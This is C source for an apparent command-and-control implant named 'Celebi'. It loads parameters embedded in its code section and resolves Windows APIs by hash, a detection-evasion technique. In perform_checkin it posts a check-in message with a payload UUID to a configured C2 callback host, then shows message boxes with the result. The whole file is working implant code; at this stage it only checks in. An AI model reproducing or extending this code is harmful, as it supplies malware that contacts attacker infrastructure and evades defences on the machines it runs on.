#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"
#include "headers/HTTP.h"

char RAW_PARAMS[1024] __attribute__((section(".text")));

WINBASEAPI HANDLE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);

WINBASEAPI int WINAPI USER32$MessageBoxA (HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);

FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

FARPROC resolve_unloaded(char * mod, char * func) {
	HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
	if (hModule == NULL) {
		hModule = KERNEL32$LoadLibraryA(mod);
	}
	return KERNEL32$GetProcAddress(hModule, func);
}

void perform_checkin(AgentParams *params, CheckinReply *reply) {
	// Generate checkin payload.
	CheckinRequest checkin = { 0 };
	checkin.payload_uuid = params->payload_uuid;
	char *msg = generate_checkin_message(&checkin);
	
	// Send checkin payload to C2 server.
	HttpHandle *http = HttpInit(params->callback_https);
	HttpURI uri = {params->callback_host, params->callback_port, params->callback_uri};
	HttpBody body = {msg, MSVCRT$strlen(msg)};
	HttpResponse response = {0};
	
	HttpRequest(http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
	
	// If we get a 200 response code, parse the reply.
	if (response.status_code == 200) {
		parse_checkin_reply(&response, reply);
	}
	
	// Free unneeded allocations.
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
	HttpDestroy(http);
}

void go() {
	AgentParams params = { 0 };
	CheckinReply reply = { 0 };
	
	unpack_params(RAW_PARAMS, &params);
	
	perform_checkin(&params, &reply);
	
	if ((reply.status != NULL) && (MSVCRT$strcmp(reply.status, "success") == 0)) {
		USER32$MessageBoxA(NULL, "Successful Checkin!", "Celebi", MB_OKCANCEL);
		USER32$MessageBoxA(NULL, reply.callback_uuid, "Celebi", MB_OKCANCEL);
	} else {
		USER32$MessageBoxA(NULL, "Checkin failed :(", "Celebi", MB_OKCANCEL);
		USER32$MessageBoxA(NULL, reply.status, "Celebi", MB_OKCANCEL);
	}

	free_params(&params);
	free_checkin_reply(&reply);
}
